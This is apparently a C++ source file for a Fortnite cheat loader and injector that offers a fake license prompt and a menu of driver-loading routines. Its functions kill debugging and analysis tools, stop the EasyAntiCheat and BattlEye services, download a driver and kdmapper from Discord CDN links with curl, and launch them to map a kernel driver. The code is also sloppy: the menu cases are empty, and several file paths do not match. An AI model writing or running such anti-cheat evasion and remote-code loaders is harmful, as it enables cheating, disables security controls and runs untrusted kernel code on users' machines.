#include <iostream>
#include <thread>
#include <assert.h>
#include <excpt.h>
#include <signal.h>
#include <shlwapi.h>
#include <windows.h>
#include <string>
#include <WinUser.h>
#include <iostream>

#include "skCrypter.h"
#include "auth.hpp"
#include "xor.h"
#include <tchar.h>

//Simple fortnite Cheat injector made in 20min :D enjoy

using namespace std;

using namespace KeyAuth;

std::string name = ("");
std::string ownerid = ("");
std::string secret = ("");
std::string version = ("1.0");
std::string url = "https://keyauth.win/api/1.1/"; // change if you're self-hosting
std::string sslPin = "ssl pin key (optional)"; // don't change unless you intend to pin public certificate key. you can get here in the "Pin SHA256" field https://www.ssllabs.com/ssltest/analyze.html?d=keyauth.win&latest. If you do this you need to be aware of when SSL key expires so you can update it

HWND window = NULL;
void kill_process()
{
    system("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1");
    system("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1");
    system("sc stop HTTPDebuggerPro >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1");
}
void eacdrivers()
{
    system("taskkill /F /IM EpicGamesLauncher.exe >nul 2>&1");
    system("taskkill /F /IM EasyAntiCheatLauncher.exe >nul 2>&1");
    system("taskkill /F /IM BEService.exe >nul 2>&1");
    system("taskkill /F /IM Fortnite.exe >nul 2>&1");
    system("taskkill /F /IM BattleEyeLauncher.exe >nul 2>&1");
    system("taskkill /F /IM FortniteClient-Win64-Shipping.exe >nul 2>&1");
    system("sc stop BEService >nul 2>&1");
    system("sc stop BEDaisy >nul 2>&1");
    system("sc stop EasyAntiCheat >nul 2>&1");
    system("sc stop EasyAntiCheatSys >nul 2>&1");

    system(" curl -s https://cdn.discordapp.com/attachments/863885312761528360/906212399567237151/your-driver -o C:\Windows\IME\your-driver");

    system(" curl -s https://cdn.discordapp.com/attachments/905707225740374026/905763413693726760/your-kdmapper.exe -o C:\Windows\IME\your-kdmapper.exe");

    system("start C:\Windows\IME\yourkdmapper.exe C:\Windows\IME\your-driver.sys");
}
void bedrivers()
{
    system("taskkill /F /IM EpicGamesLauncher.exe >nul 2>&1");
    system("taskkill /F /IM EasyAntiCheatLauncher.exe >nul 2>&1");
    system("taskkill /F /IM BEService.exe >nul 2>&1");
    system("taskkill /F /IM Fortnite.exe >nul 2>&1");
    system("taskkill /F /IM BattleEyeLauncher.exe >nul 2>&1");
    system("taskkill /F /IM FortniteClient-Win64-Shipping.exe >nul 2>&1");
    system("sc stop BEService >nul 2>&1");
    system("sc stop BEDaisy >nul 2>&1");
    system("sc stop EasyAntiCheat >nul 2>&1");
    system("sc stop EasyAntiCheatSys >nul 2>&1");

    system(" curl -s https://cdn.discordapp.com/attachments/863885312761528360/906212399567237151/your-driver -o C:\Windows\IME\your-driver");

    system(" curl -s https://cdn.discordapp.com/attachments/905707225740374026/905763413693726760/your-kdmapper.exe -o C:\Windows\IME\your-kdmapper.exe");

    system("start C:/Windows/IME/1909Mapper.exe C:/Windows/IME/1909_drv.sys");
}
void ezcatcheat()
{
    system("cls");
    std::cout << ("\n\n Start FortniteClient-Win64-Shipping.exe");
    while (window == NULL)
    {
        window = FindWindowA(0, "Fortnite  "); 
        Sleep(1);
    }
    Beep(200, 200);
    std::cout << ("\n\n Press Anything In The Lobby To Inject"); 
    system("pause >nul 2>&1");
    Beep(325, 300);
    Sleep(500);

    system(" curl -s https://cdn.discordapp.com/attachments/863885312761528360/906212399567237151/your-driver -o C:\Windows\IME\your-driver");

    system(" curl -s https://cdn.discordapp.com/attachments/905707225740374026/905763413693726760/your-kdmapper.exe -o C:\Windows\IME\your-kdmapper.exe");

    system("start C:/Windows/IME/1909Mapper.exe C:/Windows/IME/1909_drv.sys");
    system("start C:/Windows/IME/inject.bat");
}


BOOL IsAppRunningAsAdminMode()
{
    BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(
        &NtAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &pAdministratorsGroup))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

    if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

Cleanup:

    if (pAdministratorsGroup)
    {
        FreeSid(pAdministratorsGroup);
        pAdministratorsGroup = NULL;
    }

    if (ERROR_SUCCESS != dwError)
    {
        throw dwError;
    }

    return fIsRunAsAdmin;
}

int main() {
    SetConsoleTitleA("Secure Keyauth Loader by Axiom");
    cout << "[#] Welcome to Axiom Injector Loader\n\n";
    Sleep(400);
    cout << "[!] Please Enter your License :";
    int Key;
    cin >> Key;
    cout << "\n\nSuccesfuly Logged in";
    Sleep(2000);
    system("cls");
    cout << "[!] Secure Injector for Fortnite by Axiom\n\n";
    Sleep(1000);
    cout << "[1] Loader bedrivers\n\n[2] Load eacdrivers\n\n[3] Load ezcatcheat\n\n";
    cout << "[#] Please Enter Selection : ";
    int option;
    std::cin >> option;
    switch (option)
    {
    case 1:

        break;
    case 2:
   
        break;
    case 3:
       
        break;
    case 4:
        exit(0);
        break;
    }
}
